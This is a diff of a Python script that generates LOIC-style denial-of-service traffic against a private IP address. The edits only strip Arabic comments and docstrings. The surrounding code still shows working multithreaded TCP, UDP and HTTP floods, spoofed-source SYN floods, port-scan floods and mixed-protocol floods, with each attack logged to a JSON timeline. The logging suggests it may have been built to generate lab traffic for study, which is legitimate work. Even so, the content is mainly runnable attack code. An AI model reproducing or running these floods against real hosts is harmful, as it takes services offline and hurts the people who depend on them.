@@ -9,7 +9,7 @@ import requests
 
 # ======== CONFIG ========
 TARGET_IP = "192.168.17.140"
-TARGET_PORTS = [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389, 8080]  # ← بورتات متعددة
+TARGET_PORTS = [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389, 8080]  
 LOG_FILE = "loic_ddos_timeline.json"
 
 class LOICAttackGenerator:
@@ -24,11 +24,11 @@ class LOICAttackGenerator:
         self.stop_attack = False
     
     def get_random_port(self):
-        """اختيار بورت عشوائي من القائمة"""
+      
         return random.choice(self.target_ports)
     
     def log_attack_start(self, attack_type, description):
-        """تسجيل بداية الهجوم"""
+  
         self.current_attack = {
             "attack_type": attack_type,
             "description": description,
@@ -50,7 +50,7 @@ class LOICAttackGenerator:
         self.requests_sent = 0
     
     def log_attack_end(self):
-        """تسجيل نهاية الهجوم"""
+     
         self.stop_attack = True
         
         self.current_attack['end_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')
@@ -69,7 +69,7 @@ class LOICAttackGenerator:
         self.attacks.append(self.current_attack)
     
     def save_timeline(self):
-        """حفظ الـ timeline"""
+    
         with open(LOG_FILE, 'w') as f:
             json.dump(self.attacks, f, indent=2)
         
@@ -77,7 +77,7 @@ class LOICAttackGenerator:
         self.print_summary()
     
     def print_summary(self):
-        """طباعة ملخص"""
+
         print("\n" + "="*60)
         print("LOIC DDoS ATTACK SUMMARY")
         print("="*60)
@@ -104,14 +104,13 @@ class LOICAttackGenerator:
 
 # ======== 1. TCP Flood - Multi Port ========
 def loic_tcp_flood(attacker, duration=30, threads=50):
-    """TCP Flood على بورتات متعددة"""
+    
     attacker.log_attack_start("LOIC_TCP_FLOOD", "Multi-port TCP flood attack")
     
     def tcp_flood_worker():
         """Worker thread للـ TCP flood"""
         while not attacker.stop_attack:
             try:
-                # اختيار بورت عشوائي
                 target_port = attacker.get_random_port()
                 
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -144,7 +143,7 @@ def loic_tcp_flood(attacker, duration=30, threads=50):
 
 # ======== 2. UDP Flood - Multi Port ========
 def loic_udp_flood(attacker, duration=30, threads=50):
-    """UDP Flood على بورتات متعددة"""
+    
     attacker.log_attack_start("LOIC_UDP_FLOOD", "Multi-port UDP flood attack")
     
     def udp_flood_worker():
@@ -153,7 +152,7 @@ def loic_udp_flood(attacker, duration=30, threads=50):
         
         while not attacker.stop_attack:
             try:
-                # بورت عشوائي
+            
                 target_port = attacker.get_random_port()
                 
                 payload_size = random.randint(512, 4096)
@@ -183,10 +182,10 @@ def loic_udp_flood(attacker, duration=30, threads=50):
 
 # ======== 3. HTTP Flood - Multi Port ========
 def loic_http_flood(attacker, duration=30, threads=30):
-    """HTTP Flood على بورتات HTTP"""
+   
     attacker.log_attack_start("LOIC_HTTP_FLOOD", "Multi-port HTTP GET/POST flood")
     
-    # بورتات HTTP فقط
+    
     http_ports = [p for p in attacker.target_ports if p in [80, 443, 8080, 8443]]
     
     if not http_ports:
@@ -207,7 +206,7 @@ def loic_http_flood(attacker, duration=30, threads=30):
         
         while not attacker.stop_attack:
             try:
-                # بورت HTTP عشوائي
+                
                 target_port = random.choice(http_ports)
                 
                 method = random.choice(methods)
@@ -246,13 +245,13 @@ def loic_http_flood(attacker, duration=30, threads=30):
 
 # ======== 4. SYN Flood - Multi Port ========
 def loic_syn_flood(attacker, duration=30):
-    """SYN Flood على كل البورتات"""
+   
     attacker.log_attack_start("LOIC_SYN_FLOOD", "Multi-port TCP SYN flood")
     
     end_time = time.time() + duration
     
     while time.time() < end_time:
-        # بورت عشوائي من القائمة
+       
         target_port = attacker.get_random_port()
         
         pkt = IP(dst=attacker.target_ip, src=RandIP()) / \
@@ -269,18 +268,18 @@ def loic_syn_flood(attacker, duration=30):
 
 # ======== 5. Port Scan Flood ========
 def loic_portscan_flood(attacker, duration=30):
-    """Port Scan Flood - فحص كل البورتات بسرعة"""
+    
     attacker.log_attack_start("LOIC_PORTSCAN_FLOOD", "Aggressive port scan flood")
     
     end_time = time.time() + duration
     
     while time.time() < end_time:
-        # فحص كل البورتات
+        
         for port in attacker.target_ports:
             if time.time() >= end_time:
                 break
             
-            # إرسال SYN لكل بورت
+           
             pkt = IP(dst=attacker.target_ip, src=RandIP()) / \
                   TCP(sport=RandShort(), dport=port, flags="S")
             
@@ -295,11 +294,11 @@ def loic_portscan_flood(attacker, duration=30):
 
 # ======== 6. Mixed Protocol Multi-Port ========
 def loic_mixed_multiport(attacker, duration=30):
-    """Mixed attack على كل البورتات"""
+
     attacker.log_attack_start("LOIC_MIXED_MULTIPORT", "Mixed protocol multi-port flood")
     
     def mixed_worker():
-        """Worker مع protocols وبورتات عشوائية"""
+      
         while not attacker.stop_attack:
             try:
                 target_port = attacker.get_random_port()
@@ -357,7 +356,7 @@ def main():
     
     args = parser.parse_args()
     
-    # تحويل البورتات من string لـ list
+   
     target_ports = [int(p.strip()) for p in args.ports.split(',')]
     
     print("\n" + "="*60)
